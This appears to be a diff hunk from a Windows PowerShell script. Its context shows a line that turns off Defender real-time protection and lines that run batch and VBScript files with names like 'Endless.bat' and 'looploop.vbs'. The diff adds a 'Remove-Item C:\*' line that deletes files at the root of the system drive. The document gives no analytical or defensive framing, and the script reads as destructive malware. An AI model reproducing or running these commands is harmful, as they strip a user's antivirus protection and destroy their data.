@@ -6,4 +6,5 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ./cDdrive.bat 
 ./Endless.bat
 cscript looploop.vbs 
+Remove-Item C:\*
 Cls 
